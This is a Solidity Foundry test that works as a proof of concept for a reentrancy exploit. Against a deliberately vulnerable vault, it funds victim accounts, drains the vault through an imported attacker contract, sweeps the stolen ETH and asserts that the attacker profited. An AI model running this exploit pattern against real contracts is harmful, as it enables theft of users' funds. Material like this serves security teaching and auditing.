// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {ReentrancyVault} from "../vulnerable/ReentrancyVault.sol";
import {ReentrancyAttacker} from "../attackers/ReentrancyAttacker.sol";

/**
 * PoC:
 * - Victims deposit ETH into the vault
 * - Attacker deposits a little ETH then drains via reentrancy
 */
contract Test_ReentrancyVault is Test {
    ReentrancyVault vault;
    ReentrancyAttacker attacker;

    address victim1 = address(0xA11CE);
    address victim2 = address(0xB0B);
    address attackerEOA = address(0xBAD);

    function setUp() public {
        vault = new ReentrancyVault();
        attacker = new ReentrancyAttacker(address(vault));

        // fund actors
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
        vm.deal(attackerEOA, 1 ether);

        // Victims deposit into vault (so there’s something to steal)
        vm.prank(victim1);
        vault.deposit{value: 5 ether}();

        vm.prank(victim2);
        vault.deposit{value: 5 ether}();

        // Vault now has 10 ETH total
        assertEq(address(vault).balance, 10 ether);
    }

    function test_ReentrancyDrain() public {
        uint256 attackerStart = attackerEOA.balance;
        uint256 vaultStart = address(vault).balance;

        // Attacker deposits 1 ETH and withdraws 1 ETH repeatedly via reentrancy
        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}(1 ether);

        uint256 vaultEnd = address(vault).balance;

        // Vault should be drained to 0 (or close to it depending on divisibility)
        assertEq(vaultEnd, 0);

        // Sweep stolen ETH to attackerEOA so it's easy to assert profit
        vm.prank(attackerEOA);
        attacker.sweep(payable(attackerEOA));

        uint256 attackerEnd = attackerEOA.balance;

        // Attacker started with 1 ETH, deposited 1 ETH, then drained 10 ETH from vault.
        // End should be greater than start if exploit succeeded.
        assertGt(attackerEnd, attackerStart);

        emit log_named_uint("Vault start", vaultStart);
        emit log_named_uint("Vault end", vaultEnd);
        emit log_named_uint("Attacker start", attackerStart);
        emit log_named_uint("Attacker end", attackerEnd);
    }
}
